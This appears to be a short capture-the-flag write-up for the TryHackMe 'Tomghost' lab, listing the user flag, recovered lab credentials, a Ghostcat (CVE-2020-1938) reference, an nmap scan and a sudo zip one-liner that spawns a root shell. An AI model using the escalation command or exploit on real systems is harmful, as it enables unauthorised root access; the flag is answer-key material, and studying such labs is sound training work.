---
title: "Tomghost"

author: Matt Hammond
date: 2023-01-01
url: /tomghost/
image: images/2023-thumbs/tomghost.jpg
categories:
  - CTF
tags:
  - CTF
draft: false
---

## Questions

1. Compromise this machine and obtain user.txt `THM{GhostCat_1s_so_cr4sy}`
   (found in /home/merlin)
2. Escalate privileges and obtain root.txt

---

## Notes

- myIP = 10.18.53.113
- IP = 10.10.160.230

### Exposed Services

```bash
22
53
8009
8080
```

### Users:Passwords

- skyfuck:8730281lkjlkjdqlksalks (found via metasploit CVE-2020-1938)
- tryhackme:alexandru (pgp) (gpge2john)
- merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j (john)

### Vulnerabilities

- CVE-2020-1938

---

## Commands

`ping $IP`

`sudo nmap -sC -sV -oN scans/initial $IP`

`TF=$(mktemp -u)`
`sudo zip $TF /etc/hosts -T -TT 'sh #'`
